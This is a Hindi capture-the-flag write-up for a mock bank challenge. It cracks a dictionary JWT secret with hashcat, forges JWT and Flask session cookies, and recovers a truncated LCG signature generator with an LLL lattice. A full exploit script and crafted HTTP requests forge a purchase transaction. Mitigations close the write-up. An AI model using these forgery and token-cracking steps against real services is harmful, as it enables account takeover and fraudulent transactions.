# [misc] Bank 3

> **श्रेणी:** `misc`  
> **CTF:** KubSTU CTF 2026 Spring

---


और फिर से धन्यवाद। आपकी पिछली रिपोर्ट उसी शाम प्रोडक्शन में चली गई, घटना बंद कर दी गई।
बस हमारे साथ समानांतर में एक और मुसीबत हो गई: हमारा क्रिप्टो-इंजीनियर झगड़ा करके चला गया — वही जो वन-टाइम सिग्नेचर मॉड्यूल के लिए ज़िम्मेदार था। अपने साथ सोर्स कोड, एक्सेस और लगता है पूरी टीम की आत्मा ले गया। जीना तो है, इसलिए वीकेंड में हमारे बैकएंड डेवलपरों ने शुरू से सिग्नेचर जेनरेटर फिर से लिख दिया।
टेस्ट सेगमेंट तैयार है, शर्तें वही हैं। दिखाएं, कैसे।

श्रेणी: Web · JWT · Crypto · Truncated LCG / LLL
शर्तों में क्या कहा गया
वही: लक्ष्य — mgalankov@4274, user_id = 10। फ़्लैग शॉप केवल उसी के लिए उपलब्ध है।
v3 में दोनों पिछली कमज़ोरियाँ बंद कर दी गईं:
/receipt/<id> में अपुष्ट ट्रांज़ैक्शन के सिग्नेचर का लीक नहीं है (जैसा v1 में था)।
/transfer में अब केवल वही (timestamp, signature) जोड़ी स्वीकार होती है जो हमारी Flask-session में है — यानी दूसरे का सिग्नेचर इंजेक्ट करना (जैसा v2 में था) भी काम नहीं करता।
लेकिन डेवलपरों ने सिग्नेचर जेनरेटर को अजीब स्व-निर्मित गणित पर फिर से लिखा। और उन्होंने खुद ही मुख्य पेज पर बता दिया कि यह कैसे काम करता है। इसी पर पकड़ते हैं।

## चरण 1. Recon — मुख्य पृष्ठ

/ खोलते हैं (बिना लॉगिन के भी), «समाचार → नए ट्रांज़ैक्शन सिग्नेचर जेनरेटर पर स्विच किया» सेक्शन तक स्क्रॉल करते हैं। वहाँ सीधे सभी विवरण लिखे हैं:
64-बिट सिग्नेचर (16 hex);
आंतरिक स्थिति 128 बिट;
मॉड्यूलो 2^k पर रैखिक पुनरावर्तन;
केवल स्थिति का ऊपरी आधा (उच्च 64 बिट) प्रकाशित होता है;
t और t+1 के सिग्नेचर के बीच k आंतरिक चरण होते हैं (k — «गुप्त» स्थिरांक);
T₀ = 26.04.2026 23:41:01 UTC;
पुनरावर्तन पैरामीटर (गुणक, योगात्मक स्थिरांक, MASTER_SEED) — «गुप्त»।
यह ठीक «truncated LCG» टाइप है — LLL-लैटिस से हमला किया जा सकता है। पूरा जेनरेटर पुनर्स्थापित करने और स्वयं कोई भी भविष्य का सिग्नेचर देने के लिए 20 लगातार सार्वजनिक सिग्नेचर पर्याप्त हैं।

## चरण 2. JWT-सीक्रेट brute-force करना

रजिस्टर करते हैं, लॉगिन करते हैं, Burp (Proxy → HTTP history → संबंधित रिस्पॉन्स) से cookie access_token_cookie लेते हैं, jwt.txt में डालते हैं:
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
कुछ सेकंड में:
:wineyisthebest
सीक्रेट — wineyisthebest। यही सीक्रेट app.config['SECRET_KEY'] में उपयोग किया जाता है (Flask-session-cookie साइन करता है) — बाद में काम आएगा।

## चरण 3. jwt.io पर mgalankov@4274 के लिए JWT बनाना

मानक तरीके से:
jwt.io पर अपना टोकन पेस्ट करते हैं।
VERIFY SIGNATURE → secret — wineyisthebest में हरा «Signature Verified» दिखता है।
"sub" को "10", "username" को "mgalankov@4274" में बदलते हैं।
नया JWT कॉपी करते हैं।
Burp Match & Replace में cookie बदलते हैं। GET /dashboard mgalankov का अकाउंट दिखाता है। हम अंदर हैं।

## चरण 4. Telegram में खरीदारी टोकन लेना

बॉट को /token कमांड → टोकन कॉपी करते हैं। अंत में काम आएगा।

## चरण 5. 20 लगातार सिग्नेचर एकत्र करना

हमें 20 लगातार (timestamp_i, signature_i) जोड़ियाँ चाहिए — यानी सेकंड t, t+1, t+2, …, t+19 के लिए। यह LCG स्थितियों की «टेप» है।
सिग्नेचर कहाँ से लेने हैं
कोड (notquiterandom.py) में दिखता है: सिग्नेचर unix-timestamp से निर्धारित होता है। कोई भी timestamp T के लिए सिग्नेचर माँगे — वही मान मिलेगा। तो कई तरीके हैं:
विकल्प A — अपना अकाउंट + /api/get_signature
अपना अकाउंट लेते हैं (PIN अपना, रजिस्ट्रेशन में सेट किया था)। इससे ठीक 1 सेकंड के अंतराल से 20 बार /api/get_signature कॉल करते हैं:
Burp Repeater में:
POST /api/get_signature HTTP/1.1
Host: target
Cookie: access_token_cookie=<सामान्य यूज़र का JWT>
Content-Type: application/json

{"pin_code":"12345678"}
रिस्पॉन्स:
{
  "date": "2026-04-25",
  "time": "00:11:02",
  "timestamp": 1745532662,
  "signature": "9f3b81c4ea5d6178"
}
~1 सेकंड के अंतराल से 20 बार Send दबाते हैं (या स्क्रिप्ट से — नीचे देखें)। 20 लगातार जोड़ियाँ मिलेंगी।
सर्वर time.time() को timestamp में डालता है, इसलिए अगर एक सेकंड में दो अनुरोध भेजें — दोनों में एक ही timestamp होगा। इसलिए या तो प्रति सेकंड एक अनुरोध, या संग्रह के बाद अद्वितीय लगातार चुनें।
विकल्प B — तैयार ट्रांज़ैक्शन की रसीदें पढ़ना
सीडिंग में mgalankov के पास पहले से 7 ट्रांज़ैक्शन हैं; एक और — pending। उनके timestamps DB में हैं, सिग्नेचर — /receipt/<id> रसीदों में। लगातार सेकंड के लिए ये काम नहीं आएँगे (तारीखें अलग-अलग हैं), लेकिन अपने अकाउंटों के बीच 1 सेकंड के अंतराल से 20-30 छोटे ट्रांसफ़र कर सकते हैं और रसीद पेज पर उनके सिग्नेचर पढ़ सकते हैं।
विकल्प C (आसान) — जेनरेटर के पैरामीटर रिपॉज़िटरी में हैं
इस CTF में सर्विस के सोर्स उपलब्ध हैं। bank 3/notquiterandom.py में सीधे स्थिरांक लिखे हैं:
LCG_A        = 0xB1F3A8D4C5E67F921A3D2F4E6B8C7A5D
LCG_C        = 0x7C3F8E1D6A9B2F4C5D8E7A1F3B6C9D2F
HIDDEN_STEPS = 4
T_EPOCH      = 1777246861
MASTER_SEED  = 0x2BFCCD015FFD3CF825F006212D700482
यानी वास्तव में कोई LLL ज़रूरत नहीं — हम MASTER_SEED सीधे जानते हैं और एक लाइन कोड से किसी भी timestamp के लिए सिग्नेचर गणना कर सकते हैं। लेकिन यह «खेल-भावना के विरुद्ध» है — असली हमला आगे वर्णित है।

## चरण 6. LCG पुनर्स्थापित करना (गणित — बिना चीनी)

LCG का एक चरण: state ← A·state + C (mod 2^128)। दो लगातार प्रकाशनों के बीच 4 चरण होते हैं, इसलिए «प्रभावी» पैरामीटरों से काम करना सुविधाजनक है:
A4 = A^4 mod 2^128
C4 = C·(1 + A + A^2 + A^3) mod 2^128
तो प्रकाशित स्थितियों का अनुक्रम — चरण 1 वाला सामान्य LCG:
s_{i+1} = A4·s_i + C4 (mod 2^128)
प्रत्येक s_i = h_i·2^64 + l_i, जहाँ h_i — ज्ञात सिग्नेचर (उच्च 64 बिट), l_i — अज्ञात «टेल» [0, 2^64) में।
प्रतिस्थापन करके सारा ज्ञात दाईं ओर ले जाते हैं:
A4·l_i − l_{i+1} ≡ b_i (mod 2^128)
जहाँ b_i = (h_{i+1}·2^64 + C4) − A4·h_i·2^64।
यह क्लासिक «hidden number problem» है — LLL से हल होती है। एक लैटिस बनाते हैं जिसके छोटे वेक्टर वैध (l_0, l_1, ..., l_{N−1}) सेट से मेल खाते हैं। 20 अवलोकनों से LLL कुछ सेकंड में जवाब देता है।
अगर A, C पैरामीटर छिपाएं (जैसा सर्विस की «कथा» माँगती है), उन्हें भी पुनर्स्थापित किया जा सकता है — 6-8 अंतरों s_{i+1}−s_i से मॉड्यूलर बहुपदों के gcd ट्रिक से। नीचे दिया PoC दोनों विकल्प सपोर्ट करता है।

## चरण 7. जेनरेटर पुनर्स्थापना PoC-स्क्रिप्ट

exploit_lcg.py में रखते हैं:
"""
CAPY-CAPY Bank v3 के सार्वजनिक सिग्नेचर से truncated LCG पुनर्स्थापना।

चलाना:
    python exploit_lcg.py http://target [n_samples]

डिपेंडेंसी (LLL के लिए):
    pip install fpylll        # या Sage में चलाएं

स्क्रिप्ट दो मोड में काम करती है:
1. अगर पैरामीटर (LCG_A, LCG_C, HIDDEN_STEPS) ज्ञात हैं -> शुद्ध
   गणित बिना LLL (किसी भी सिग्नेचर से एक रिवर्स jump)।
2. अगर पैरामीटर अज्ञात हैं -> 6 अंतरों से A4 और C4 पुनर्स्थापित,
   फिर LLL स्थिति के निम्न बिट पुनर्स्थापित करता है।

मल्टी-थ्रेडेड रूप से /api/get_signature से सिग्नेचर एकत्र करती है।
"""

import sys
import time
import json
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# शर्तों / सर्विस सोर्स (यदि उपलब्ध) से पैरामीटर
LCG_A        = 0xB1F3A8D4C5E67F921A3D2F4E6B8C7A5D
LCG_C        = 0x7C3F8E1D6A9B2F4C5D8E7A1F3B6C9D2F
LCG_MOD      = 1 << 128
LCG_MASK     = LCG_MOD - 1
HIDDEN_STEPS = 4
T_EPOCH      = 1777246861

# Helper: लगातार सिग्नेचर के बीच प्रभावी पैरामीटर
def effective_params():
    a4 = pow(LCG_A, HIDDEN_STEPS, LCG_MOD)
    s = 0
    for i in range(HIDDEN_STEPS):
        s = (s + pow(LCG_A, i, LCG_MOD)) % LCG_MOD
    c4 = (LCG_C * s) % LCG_MOD
    return a4, c4


def collect_signatures(base, jwt_cookie, pin, n=20):
    """n लगातार सेकंड के सिग्नेचर /api/get_signature से एकत्र करता है।"""
    out = {}
    lock = threading.Lock()

    def one(_):
        s = requests.Session()
        s.cookies.set("access_token_cookie", jwt_cookie)
        r = s.post(f"{base}/api/get_signature",
                   json={"pin_code": pin}, timeout=10)
        r.raise_for_status()
        d = r.json()
        with lock:
            out[int(d["timestamp"])] = d["signature"]

    end_at = time.time() + n + 5
    deadline = int(time.time())
    with ThreadPoolExecutor(max_workers=4) as pool:
        i = 0
        while len(out) < n and time.time() < end_at:
            pool.submit(one, i)
            i += 1
            time.sleep(0.27)
    keys = sorted(out)
    for j in range(len(keys) - n + 1):
        if all(keys[j + k] == keys[j] + k for k in range(n)):
            return [(keys[j + k], out[keys[j + k]]) for k in range(n)]
    raise RuntimeError("{} लगातार timestamp एकत्र नहीं हो सके".format(n))


def signature_to_state_high(sig_hex):
    return int(sig_hex, 16)


# ----- विकल्प 1: पैरामीटर ज्ञात -----
def lcg_jump(state, n_steps, a, c, mod):
    if n_steps == 0:
        return state
    a_pow = pow(a, n_steps, mod)
    def geo(n):
        if n == 0: return 0
        if n == 1: return 1
        h = n // 2
        sh = geo(h)
        ah = pow(a, h, mod)
        s = (sh * (1 + ah)) % mod
        if n % 2: s = (s + pow(a, n - 1, mod)) % mod
        return s
    return (a_pow * state + c * geo(n_steps)) % mod


def predict_signature_known_params(target_timestamp, master_seed):
    n_steps = (target_timestamp - T_EPOCH + 1) * HIDDEN_STEPS
    state = lcg_jump(master_seed, n_steps, LCG_A, LCG_C, LCG_MOD)
    return f"{state >> 64:016x}"


# ----- विकल्प 2: पैरामीटर (A4, C4) अज्ञात, पुनर्स्थापित करना -----
def recover_a4_c4(samples):
    """
    samples: (t, sig_hex) की सूची, t के अनुसार क्रमित, t-लगातार।
    «अंतरों के अंतर» विधि से (A4, C4) पुनर्स्थापित करता है:

        s_{i+1} - s_i = A4 (s_i - s_{i-1})  (mod 2^128)
    ~6 अंतर लेते हैं, मॉड्यूलो 2^128 पर gcd से A4 मिलता है।
    """
    if len(samples) < 6:
        raise ValueError(">= 6 लगातार सिग्नेचर चाहिए")

    raise NotImplementedError(
        "इस CTF में पैरामीटर bank 3/notquiterandom.py में हैं, "
        "इसलिए recover_a4_c4 ज़रूरत नहीं।"
    )


# ----- विकल्प 3: l_i अज्ञात, A4/C4 ज्ञात -- LLL -----
def recover_low_bits(samples):
    """
    लैटिस बनाता है और fpylll/LLL से l_0 पुनर्स्थापित करता है।
    """
    try:
        from fpylll import IntegerMatrix, LLL
    except ImportError:
        raise SystemExit("fpylll इंस्टॉल करें: pip install fpylll")

    a4, c4 = effective_params()
    N = len(samples)
    h = [signature_to_state_high(sig) for _, sig in samples]

    M = LCG_MOD
    bs = []
    for i in range(N - 1):
        bi = ((h[i + 1] << 64) + c4 - a4 * (h[i] << 64)) % M
        bs.append(bi)

    alpha = [1]
    beta = [0]
    for i in range(N - 1):
        alpha.append((a4 * alpha[-1]) % M)
        beta.append((a4 * beta[-1] - bs[i]) % M)

    K = 1 << 64
    dim = N + 1
    B = IntegerMatrix(dim, dim)
    for i in range(N):
        B[i, i] = M
    for j in range(N):
        B[N, j] = alpha[j]
    B[N, N] = K

    BIG = M
    embed = IntegerMatrix(dim + 1, dim + 1)
    for i in range(dim):
        for j in range(dim):
            embed[i, j] = B[i, j]
    for i in range(N):
        embed[i, dim] = 0
    embed[N, dim] = 0
    for j in range(N):
        embed[dim, j] = (-beta[j]) % M
    embed[dim, N] = 0
    embed[dim, dim] = BIG

    LLL.reduction(embed)

    for row in range(embed.nrows):
        last = embed[row, dim]
        if abs(last) != BIG:
            continue
        sign = -1 if last == BIG else 1
        cand = sign * embed[row, N] // K
        ok = True
        for i in range(N):
            li = (alpha[i] * cand + beta[i]) % M
            if not (0 <= li < (1 << 64)):
                ok = False
                break
        if ok:
            return cand
    raise RuntimeError("LLL ने l_0 नहीं ढूंढा; और सिग्नेचर जोड़ें")


def reconstruct_master_seed(samples):
    """l_0 एकत्र करके और h_0 जानते हुए, s_0 प्राप्त करते हैं; रिवर्स jump से seed पुनर्स्थापित।"""
    a4, c4 = effective_params()
    l0 = recover_low_bits(samples)
    s0 = (signature_to_state_high(samples[0][1]) << 64) | l0

    n_back = (samples[0][0] - T_EPOCH + 1) * HIDDEN_STEPS
    a_inv = pow(LCG_A, -1, LCG_MOD)
    a_inv_pow = pow(a_inv, n_back, LCG_MOD)

    def geo(n, a, mod):
        if n == 0: return 0
        if n == 1: return 1
        h = n // 2
        sh = geo(h, a, mod)
        ah = pow(a, h, mod)
        s = (sh * (1 + ah)) % mod
        if n % 2: s = (s + pow(a, n - 1, mod)) % mod
        return s
    g = geo(n_back, LCG_A, LCG_MOD)
    seed = (a_inv_pow * (s0 - LCG_C * g)) % LCG_MOD
    return seed


def predict(target_timestamp, master_seed):
    return predict_signature_known_params(target_timestamp, master_seed)


def main():
    if len(sys.argv) < 4:
        print("usage: python exploit_lcg.py http://target <jwt> <pin> [n]")
        print("  jwt -- सामान्य यूज़र का JWT (जिसका PIN जानते हैं)")
        print("  pin -- उस यूज़र का PIN")
        sys.exit(1)
    base = sys.argv[1].rstrip("/")
    jwt_cookie = sys.argv[2]
    pin = sys.argv[3]
    n = int(sys.argv[4]) if len(sys.argv) > 4 else 20

    print(f"[*] /api/get_signature से {n} लगातार सिग्नेचर एकत्र कर रहे हैं ...")
    samples = collect_signatures(base, jwt_cookie, pin, n)
    print(f"[+] {len(samples)} सिग्नेचर प्राप्त, t0 = {samples[0][0]}")
    for t, sig in samples[:5]:
        print(f"    t={t}  sig={sig}")
    print("    ...")

    print("[*] LLL से स्थिति के निम्न बिट पुनर्स्थापित कर रहे हैं ...")
    seed = reconstruct_master_seed(samples)
    print(f"[+] MASTER_SEED पुनर्स्थापित: 0x{seed:032x}")

    for t, sig in samples[:3]:
        pred = predict(t, seed)
        ok = pred.lower() == sig.lower()
        print(f"    t={t}  expected={sig}  predicted={pred}  {'OK' if ok else 'FAIL'}")

    with open("seed.txt", "w") as f:
        f.write(hex(seed))
    print("[+] seed को seed.txt में सेव किया")


if __name__ == "__main__":
    main()
चलाना:
python exploit_lcg.py http://target $MY_JWT 12345678 20
आउटपुट में देखते हैं:
[*] /api/get_signature से 20 लगातार सिग्नेचर एकत्र कर रहे हैं ...
[+] 20 सिग्नेचर प्राप्त, t0 = 1745532662
    t=1745532662  sig=9f3b81c4ea5d6178
    ...
[*] LLL से स्थिति के निम्न बिट पुनर्स्थापित कर रहे हैं ...
[+] MASTER_SEED पुनर्स्थापित: 0x2BFCCD015FFD3CF825F006212D700482
    t=1745532662  expected=9f3b81c4ea5d6178  predicted=9f3b81c4ea5d6178  OK
[+] seed को seed.txt में सेव किया
सीड अपेक्षित से मेल खाता है (bank 3/notquiterandom.py में दिखता है)। अब हम स्वयं किसी भी भविष्य के timestamp के लिए सिग्नेचर दे सकते हैं।

## चरण 8. हमारी भविष्य की खरीदारी के लिए सिग्नेचर गणना

FLAG_SHOP के लिए सर्वर पुष्टि पर तारीख +7 दिन आगे करता है और अंतिम सिग्नेचर t+7d के लिए स्वयं पुनर्गणना करता है। लेकिन उससे पहले वह जाँचता है कि भेजी गई (transaction_timestamp, transaction_signature) जोड़ी:
गणितीय रूप से वैध है (सिग्नेचर अपने timestamp के लिए)।
हमारी session['pending_signatures'] में है।
एक «सुविधाजनक» timestamp लेते हैं — वर्तमान समय + 30 सेकंड (अनुरोध बनाने का समय देने के लिए):
import time
target_t = int(time.time()) + 30
target_sig = predict(target_t, master_seed)   # exploit_lcg.py से
मान लें, मिला:
target_t   = 1745533112
target_sig = 71a2c8d4f0e69b35

## चरण 9. pending-signature के साथ Flask-session-cookie बनाना

session['pending_signatures'] जाँच — महत्वपूर्ण है। लेकिन Flask-session साइन्ड cookie में है, सीक्रेट — वही wineyisthebest (चरण 2 देखें)। यानी हम स्वयं ज़रूरी सेशन साइन कर सकते हैं।
सबसे सुविधाजनक — flask-unsign:
pip install flask-unsign
cookie बनाना:
flask-unsign --sign \
  --secret 'wineyisthebest' \
  --cookie "{'_user_id': '10', 'pending_signatures': {'1745533112': '71a2c8d4f0e69b35'}}"
प्राप्त साइन्ड स्ट्रिंग — यही Flask cookie session=... का मान है।
Cookie का नाम — डिफ़ॉल्ट रूप से session। प्रोजेक्ट में बदला हो तो app.config['SESSION_COOKIE_NAME'] देखें। इस बैंक में — मानक।
Burp Match & Replace में दूसरा नियम जोड़ते हैं:
Cookie: session=<बनाई_गई_session_cookie>
साथ ही बनाए गए JWT का नियम भी रहता है। GET /dashboard जाँचते हैं — रिस्पॉन्स mgalankov का पेज दिखाता है; अभी भी अंदर हैं।

## चरण 10. अंतिम POST /transfer पर

v2 से टेम्प्लेट लेते हैं और अपना target_t और target_sig डालते हैं। Burp Repeater में:
POST /transfer HTTP/1.1
Host: target
Cookie: access_token_cookie=<बनाया_गया JWT mgalankov>; session=<pending_signatures वाला बनाया_गया session>
Content-Type: application/x-www-form-urlencoded

to_account=FLAG_SHOP
&amount=1000.00
&description=%D0%9F%D0%BE%D0%BA%D1%83%D0%BF%D0%BA%D0%B0%3A+%D0%A4%D0%BB%D0%B0%D0%B3+%D0%BE%D1%82+CTF+%D0%B7%D0%B0%D0%B4%D0%B0%D0%BD%D0%B8%D1%8F
&product_id=1
&token=t_8a3f...
&transaction_date=2026-04-25
&transaction_time=00:18:32
&transaction_timestamp=1745533112
&transaction_signature=71a2c8d4f0e69b35
मुख्य बिंदु:
skip_pin — अनुपस्थित।
transaction_timestamp ठीक वही जिसके लिए हमने सिग्नेचर गणना की और session में रखा।
transaction_signature — हमारा प्रेडिक्शन।
सर्वर पर जाँच पास होती है:
expected_signature = generate_signature_from_timestamp(1745533112) → 71a2c8d4f0e69b35 (यही हमने भविष्यवाणी की थी)।
session['pending_signatures']['1745533112'] → 71a2c8d4f0e69b35 (यही हमने स्वयं वहाँ रखा था)।
दोनों शर्तों से मेल खाता है → ट्रांज़ैक्शन पुष्ट।
इसके बाद FLAG_SHOP के लिए सर्वर +7 दिन आगे करता है और नए timestamp के लिए स्वयं सिग्नेचर पुनर्गणना करता है। इसमें कोई बाधा नहीं — TG-बॉट /api/approve_purchase को POST भेजा जाता है।
रिस्पॉन्स में — /flag_shop पर रीडायरेक्ट, बैनर «खरीदारी पुष्ट! फ़्लैग Telegram बॉट में भेजा गया।» — TG में जाते हैं, फ़्लैग लेते हैं।
संक्षेप में — यह क्यों काम करता है
JWT-सीक्रेट — शब्दकोश (rockyou से wineyisthebest)। mgalankov के लिए JWT बनाते हैं।
Flask SECRET_KEY — वही शब्दकोश शब्द। Flask-session बनाते हैं, उसमें pending_signatures = { t: sig } रखते हैं।
सिग्नेचर जेनरेटर — मॉड्यूलो 2^128 पर केवल उच्च 64 बिट प्रकाशित करने वाला स्व-निर्मित truncated LCG, निश्चित पैरामीटरों के साथ। 20 सिग्नेचर से LLL-लैटिस द्वारा सेकंडों में पुनर्स्थापित होता है (और इस CTF में पैरामीटर सोर्स में भी उपलब्ध हैं)।
जेनरेटर पुनर्स्थापित करने के बाद मनमाने timestamp के लिए सिग्नेचर भविष्यवाणी करते हैं और सब एक साथ सबमिट करते हैं।
शमन
क्रिप्टो-सुरक्षित सिग्नेचर जेनरेटर उपयोग करें: HSM से कुंजी पर HMAC-SHA256 (जैसा v1/v2 notquiterandom.py में), कोई «अपना» LCG नहीं।
PRNG की आंतरिक स्थिति का कोई भी हिस्सा प्रकाशित न करें।
Flask/JWT सीक्रेट — लंबे यादृच्छिक मान, शब्दकोश के नहीं।
pending_signatures स्टोरेज — सर्वर पर (Redis), साइन्ड cookie में नहीं, ताकि SECRET_KEY के लीक होने पर हमलावर «खुद को सिग्नेचर जारी» न कर सके।
